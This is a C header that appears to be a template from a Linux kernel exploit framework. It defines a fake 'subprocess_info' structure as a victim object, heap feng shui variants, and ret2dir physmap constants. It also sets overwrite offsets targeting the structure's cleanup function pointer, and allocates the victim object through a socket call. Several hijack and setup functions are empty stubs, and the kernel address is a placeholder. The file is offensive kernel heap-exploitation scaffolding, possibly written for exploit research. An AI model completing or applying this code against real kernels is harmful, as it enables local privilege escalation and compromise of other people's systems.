#ifndef _SUBPROCESS_INFO_TMPL_H_
#define _SUBPROCESS_INFO_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#define KMALLOC_SIZE 96

#define RACE_IT

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

#ifdef FENGSHUI1

struct subprocess_info {
	char hole1[0x28];
	char* path;
	char hole2[0x20];
	void* cleanup;
    char hole3[0x8];
};

struct subprocess_info fake_subprocess_info;

unsigned overwrite_start = 0x50;
unsigned overwrite_end = 0x58;

void* victim_obj = (void*)&fake_subprocess_info;

uint64_t kaddr = 0xffffffffdeadbeef;

void do_setup_physmap() {
}

void do_alloc_victim() {
	socket(22, AF_INET, 0);
}

void do_hijack() {
}

#endif // FENGSHUI1

#ifdef FENGSHUI4

struct subprocess_info {
	char hole1[0x28];
	char* path;
	char hole2[0x20];
	void* cleanup;
    char hole3[0x8];
};

struct subprocess_info fake_subprocess_info;

unsigned overwrite_start = 0x0;
unsigned overwrite_end = 0x8;

void* victim_obj = (void*)&fake_subprocess_info;

uint64_t kaddr = 0xffffffffdeadbeef;

void do_setup_physmap() {
}

extern void do_defragment();
void do_alloc_step() {
  do_defragment(KMALLOC_SIZE, 1);
}

void do_alloc_victim() {
  do_alloc_step();
  socket(22, AF_INET, 0);
}

void do_hijack() {
}

#endif // FENGSHUI4

#endif
